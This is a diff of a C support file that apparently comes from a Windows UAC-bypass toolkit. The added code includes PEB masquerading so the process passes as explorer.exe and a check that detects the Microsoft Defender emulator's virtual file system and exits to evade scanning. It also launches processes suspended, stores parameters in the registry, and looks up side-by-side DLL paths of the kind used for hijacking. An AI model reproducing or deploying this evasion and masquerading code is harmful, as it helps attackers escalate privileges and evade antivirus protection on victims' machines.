@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2016
+*  (C) COPYRIGHT AUTHORS, 2015 - 2017
 *
 *  TITLE:       SUP.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.56
 *
-*  DATE:        25 May 2016
+*  DATE:        14 Feb 2017
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -110,7 +110,8 @@ BOOL supWriteBufferToFile(
     hFile = CreateFileW(lpFileName,
         GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
-    if (hFile == INVALID_HANDLE_VALUE) {
+    if (hFile == INVALID_HANDLE_VALUE) {       
+        supDebugPrint(TEXT("CreateFile"), GetLastError());
         return FALSE;
     }
 
@@ -118,6 +119,152 @@ BOOL supWriteBufferToFile(
     CloseHandle(hFile);
 
     return (bytesIO == BufferSize);
+}
+
+/*
+* supDebugPrint
+*
+* Purpose:
+*
+* Write formatted debug output.
+*
+*/
+VOID supDebugPrint(
+    LPWSTR ApiName,
+    DWORD status
+)
+{
+    LPWSTR lpBuffer;
+    SIZE_T sz;
+
+    sz = MAX_PATH;
+    if (ApiName) 
+        sz += _strlen(ApiName);
+
+    lpBuffer = HeapAlloc(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+    if (lpBuffer) {
+        _strcpy(lpBuffer, TEXT("[UCM] "));
+        if (ApiName) {
+            _strcat(lpBuffer, ApiName);
+        }
+        _strcat(lpBuffer, TEXT(" code = "));
+        ultostr(status, _strend(lpBuffer));
+        _strcat(lpBuffer, TEXT("\n"));
+        OutputDebugString(lpBuffer);
+        HeapFree(g_ctx.Peb->ProcessHeap, 0, lpBuffer);
+    }
+}
+
+/*
+* supReadFileToBuffer
+*
+* Purpose:
+*
+* Read file to buffer. Release memory when it no longer needed.
+*
+*/
+PBYTE supReadFileToBuffer(
+    _In_ LPWSTR lpFileName,
+    _Inout_opt_ LPDWORD lpBufferSize
+    )
+{
+    BOOL        bCond = FALSE;
+    NTSTATUS    status;
+    HANDLE      hFile = NULL, hRoot = NULL;
+    PBYTE       Buffer = NULL;
+    SIZE_T      sz = 0;
+
+    UNICODE_STRING              usName;
+    OBJECT_ATTRIBUTES           attr;
+    IO_STATUS_BLOCK             iost;
+    FILE_STANDARD_INFORMATION   fi;
+
+    do {
+
+        RtlSecureZeroMemory(&usName, sizeof(usName));
+
+        if (lpFileName == NULL)
+            return NULL;
+
+        if (!RtlDosPathNameToNtPathName_U(
+            NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer, &usName, NULL, NULL))
+        {
+            break;
+        }
+
+        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);
+        status = NtCreateFile(&hRoot, FILE_LIST_DIRECTORY | SYNCHRONIZE,
+            &attr,
+            &iost,
+            NULL,
+            0,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL,
+            0
+        );
+
+        RtlFreeUnicodeString(&usName);
+
+        if (!NT_SUCCESS(status)) {
+            supDebugPrint(TEXT("OpenDirectory"), RtlNtStatusToDosError(status));
+            break;
+        }
+
+        RtlInitUnicodeString(&usName, lpFileName);
+        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, hRoot, NULL);
+
+        status = NtCreateFile(&hFile, 
+            FILE_READ_DATA | SYNCHRONIZE, 
+            &attr, 
+            &iost, 
+            NULL, 
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_READ,
+            FILE_OPEN, 
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 
+            NULL, 
+            0
+        );
+
+        if (!NT_SUCCESS(status)) {
+            supDebugPrint(TEXT("CreateFile"), RtlNtStatusToDosError(status));
+            break;
+        }
+
+        RtlSecureZeroMemory(&fi, sizeof(fi));
+        status = NtQueryInformationFile(hFile, &iost, &fi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
+        if (!NT_SUCCESS(status))
+            break;
+
+        sz = (SIZE_T)fi.EndOfFile.LowPart;
+        status = NtAllocateVirtualMemory(NtCurrentProcess(), &Buffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (NT_SUCCESS(status)) {
+
+            status = NtReadFile(hFile, NULL, NULL, NULL, &iost, Buffer, fi.EndOfFile.LowPart, NULL, NULL);
+            if (NT_SUCCESS(status)) {
+                if (lpBufferSize)
+                    *lpBufferSize = fi.EndOfFile.LowPart;
+            }
+            else {
+                sz = 0;
+                NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
+                Buffer = NULL;
+            }
+        }
+
+    } while (bCond);
+
+    if (hRoot != NULL) {
+        NtClose(hRoot);
+    }
+
+    if (hFile != NULL) {
+        NtClose(hFile);
+    }
+
+    return Buffer;
 }
 
 /*
@@ -163,10 +310,11 @@ BOOL supRunProcess(
 * Start new process in suspended state.
 *
 */
-HANDLE supRunProcessEx(
+HANDLE NTAPI supRunProcessEx(
     _In_ LPWSTR lpszParameters,
     _In_opt_ LPWSTR lpCurrentDirectory,
-    _Out_opt_ HANDLE *PrimaryThread
+    _Out_opt_ HANDLE *PrimaryThread,
+    _Inout_opt_ LPWSTR lpApplicationName
     )
 {
     BOOL cond = FALSE;
@@ -174,7 +322,8 @@ HANDLE supRunProcessEx(
     SIZE_T ccb;
     STARTUPINFOW sti1;
     PROCESS_INFORMATION pi1;
-
+    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;
+    
     if (PrimaryThread) {
         *PrimaryThread = NULL;
     }
@@ -182,7 +331,7 @@ HANDLE supRunProcessEx(
     if (lpszParameters == NULL) {
         return NULL;
     }
-
+    
     ccb = (_strlen_w(lpszParameters) * sizeof(WCHAR)) + sizeof(WCHAR);
     pszBuffer = HeapAlloc(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, ccb);
     if (pszBuffer == NULL) {
@@ -194,11 +343,10 @@ HANDLE supRunProcessEx(
     RtlSecureZeroMemory(&pi1, sizeof(pi1));
     RtlSecureZeroMemory(&sti1, sizeof(sti1));
     GetStartupInfoW(&sti1);
-
+    
     do {
 
-        if (!CreateProcessW(NULL, pszBuffer, NULL, NULL, FALSE,
-            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED,
+        if (!CreateProcessAsUser(NULL, lpApplicationName, pszBuffer, NULL, NULL, FALSE, dwFlags | CREATE_SUSPENDED,
             NULL, lpCurrentDirectory, &sti1, &pi1))
         {
             break;
@@ -213,7 +361,7 @@ HANDLE supRunProcessEx(
     } while (cond);
 
     HeapFree(g_ctx.Peb->ProcessHeap, 0, pszBuffer);
-
+    
     return pi1.hProcess;
 }
 
@@ -314,6 +462,8 @@ BOOL supSetParameter(
         if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
             break;
         }
+
+        RegSetValueExW(hKey, T_AKAGI_FLAG, 0, REG_DWORD, (BYTE *)&g_ctx.Flag, sizeof(DWORD));
 
         lRet = RegSetValueExW(hKey, T_AKAGI_PARAM, 0, REG_SZ,
             (LPBYTE)lpParameter, cbParameter);
@@ -503,25 +653,32 @@ VOID supMasqueradeProcess(
     VOID
     )
 {
-    SIZE_T  sz = 0x1000;
-    PPEB    Peb = g_ctx.Peb;
-    WCHAR   szBuffer[MAX_PATH + 1];
+    SIZE_T  sz;
+    DWORD   cch;
+    WCHAR   szBuffer[MAX_PATH * 2];
 
     RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-    GetWindowsDirectory(szBuffer, MAX_PATH);
-    _strcat(szBuffer, L"\\explorer.exe");
+    cch = GetWindowsDirectory(szBuffer, MAX_PATH);
+    if ((cch != 0) && (cch < MAX_PATH)) {
 
-    NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    _strcpy(g_lpszExplorer, szBuffer);
+        _strcat(szBuffer, L"\\explorer.exe");
 
-    RtlEnterCriticalSection(Peb->FastPebLock);
+        g_lpszExplorer = NULL;
+        sz = 0x1000;
+        NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (g_lpszExplorer) {
+            _strcpy(g_lpszExplorer, szBuffer);
 
-    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
-    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);
+            RtlEnterCriticalSection(g_ctx.Peb->FastPebLock);
 
-    RtlLeaveCriticalSection(Peb->FastPebLock);
+            RtlInitUnicodeString(&g_ctx.Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
+            RtlInitUnicodeString(&g_ctx.Peb->ProcessParameters->CommandLine, APPCMDLINE);
 
-    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
+            RtlLeaveCriticalSection(g_ctx.Peb->FastPebLock);
+
+            LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)g_ctx.Peb);
+        }
+    }
 }
 
 /*
@@ -568,4 +725,182 @@ DWORD supExpandEnvironmentStrings(
         RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
         return 0;
     }
+}
+
+/*
+* supScanFiles
+*
+* Purpose:
+*
+* Find files of the given type and run callback over them.
+*
+*/
+BOOL supScanFiles(
+    _In_ LPWSTR lpDirectory,
+    _In_ LPWSTR lpFileType,
+    _In_ UCM_FIND_FILE_CALLBACK Callback
+    )
+{
+    BOOL bStopEnumeration = FALSE;
+    HANDLE hFile;
+    WCHAR textbuf[MAX_PATH * 2];
+    WIN32_FIND_DATA fdata;
+
+    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
+        return FALSE;
+
+    RtlSecureZeroMemory(textbuf, sizeof(textbuf));
+
+    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
+    _strcat(textbuf, L"\\");
+    _strncpy(_strend(textbuf), 20, lpFileType, 20);
+
+    RtlSecureZeroMemory(&fdata, sizeof(fdata));
+    hFile = FindFirstFile(textbuf, &fdata);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        do {
+
+            bStopEnumeration = Callback(&fdata, lpDirectory);
+            if (bStopEnumeration)
+                break;
+
+        } while (FindNextFile(hFile, &fdata));
+        FindClose(hFile);
+    }
+    return bStopEnumeration;
+}
+
+/*
+* supCheckMSEngineVFS
+*
+* Purpose:
+*
+* Detect Microsoft Security Engine emulation by it own VFS artefact.
+*
+* Microsoft AV provides special emulated environment for scanned application where it
+* fakes general system information, process environment structures/data to make sure 
+* API calls are transparent for scanned code. It also use simple Virtual File System 
+* allowing this AV track file system changes and if needed continue emulation on new target.
+*
+* This method implemented in commercial malware presumable since 2013.
+*
+*/
+VOID supCheckMSEngineVFS(
+    VOID
+    )
+{
+    WCHAR szBuffer[MAX_PATH];
+    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };
+
+    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+    GetModuleFileName(NULL, szBuffer, MAX_PATH);
+    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
+        ExitProcess((UINT)0);
+    }
+}
+
+/*
+* sxsFilePathNoSlash
+*
+* Purpose:
+*
+* same as _filepath except it doesnt return last slash.
+*
+*/
+wchar_t *sxsFilePathNoSlash(
+    const wchar_t *fname, 
+    wchar_t *fpath
+    )
+{
+    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;
+
+    if ((fname == 0) || (fpath == NULL))
+        return 0;
+
+    while (*fname != (wchar_t)0) {
+        if (*fname == '\\')
+            p = (wchar_t *)fname;
+        fname++;
+    }
+
+    while (p0 < p) {
+        *p1 = *p0;
+        p1++;
+        p0++;
+    }
+    *p1 = 0;
+
+    return fpath;
+}
+
+/*
+* sxsFindDllCallback
+*
+* Purpose:
+*
+* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
+*
+*/
+VOID NTAPI sxsFindDllCallback(
+    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
+    _In_ PVOID Context,
+    _In_ OUT BOOLEAN *StopEnumeration
+    )
+{
+    BOOL bCond = FALSE;
+    BOOLEAN bFound = FALSE;
+    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;
+
+    do {
+
+        if ((sctx == NULL) || (DataTableEntry == NULL))
+            break;
+
+        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
+            (DataTableEntry->FullDllName.Buffer == NULL))
+            break;
+
+        if (_strcmpi(DataTableEntry->BaseDllName.Buffer, sctx->DllName) != 0)
+            break;
+
+        if (_strstri(DataTableEntry->FullDllName.Buffer, sctx->PartialPath) == NULL)
+            break;
+
+        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer, sctx->FullDllPath) == NULL)
+            break;
+
+        bFound = TRUE;
+
+    } while (bCond);
+
+    *StopEnumeration = bFound;
+}
+
+/*
+* supNativeGetProcAddress
+*
+* Purpose:
+*
+* Simplified native GetProcAddress.
+*
+*/
+PVOID supNativeGetProcAddress(
+    WCHAR *Module,
+    CHAR *Routine
+)
+{
+    PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
+    UNICODE_STRING   DllName;
+    ANSI_STRING      str;
+
+    RtlSecureZeroMemory(&DllName, sizeof(DllName));
+    RtlInitUnicodeString(&DllName, Module);
+    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
+        return NULL;
+
+    RtlInitString(&str, Routine);
+    if (!NT_SUCCESS(LdrGetProcedureAddress(DllImageBase, &str, 0, &ProcedureAddress)))
+        return NULL;
+
+    return ProcedureAddress;
 }
